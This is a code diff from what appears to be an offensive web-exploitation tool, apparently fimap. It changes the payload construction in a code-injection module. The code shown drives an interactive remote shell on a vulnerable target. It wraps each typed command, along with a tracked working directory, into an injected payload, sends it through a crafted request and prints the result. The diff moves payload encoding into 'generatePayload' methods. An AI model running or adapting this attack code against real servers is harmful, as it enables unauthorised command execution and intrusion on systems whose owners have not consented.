@@ -177,7 +177,7 @@ class codeinjector(baseClass):
                     if (attack == "fimap_shell"):
                         cmd = ""
                         print "Please wait - Setting up shell (one request)..."
-                        pwd_cmd = payload.replace("__PAYLOAD__", base64.b64encode("pwd"))
+                        pwd_cmd = item.generatePayload("pwd", True)
                         curdir = self.__doHaxRequest(url, postdata, mode, pwd_cmd, suffix).strip()
                         print shell_banner
 
@@ -186,11 +186,11 @@ class codeinjector(baseClass):
                             if cmd == "q" or cmd == "quit": break
                             
                             if (cmd.strip() != ""):
-                                userload = payload.replace("__PAYLOAD__", base64.b64encode("cd '%s'; %s"%(curdir, cmd)))
+                                userload = item.generatePayload("cd '%s'; %s"%(curdir, cmd), True)
                                 code = self.__doHaxRequest(url, postdata, mode, userload, suffix)
                                 if (cmd.startswith("cd ")):
                                     cmd = "cd '%s'; %s; pwd"%(curdir, cmd)
-                                    cmd = payload.replace("__PAYLOAD__", base64.b64encode(cmd))
+                                    cmd = item.generatePayload(cmd, True)
                                     curdir = self.__doHaxRequest(url, postdata, cmd , suffix).strip()
                                 print code.strip()
                         print "See ya dude!"
@@ -199,24 +199,14 @@ class codeinjector(baseClass):
                     else:
                         print "Strange stuff..."
                 else:
-                    typ       = attack[0]
-                    attack    = attack[1]
-
-                    questions = attack[0]
-                    cpayload   = attack[1]
-
-                    if (questions != None):
-                        for q, p in questions:
-                            v = raw_input(q)
-                            cpayload = cpayload.replace(p, v)
+                    cpayload = attack.generatePayload()
 
                     shellcode = None
 
-                    if (typ=="php"):
+                    if (not attack.doInShell()):
                         shellcode = cpayload
-                    elif (typ=="sys"):
-                        shellcode = working_shell[1]
-                        shellcode = shellcode.replace("__PAYLOAD__", base64.b64encode(cpayload))
+                    else:
+                        shellcode = item.generatePayload(cpayload, True)
 
 
                     code = self.__doHaxRequest(url, postdata, mode, shellcode, appendix)
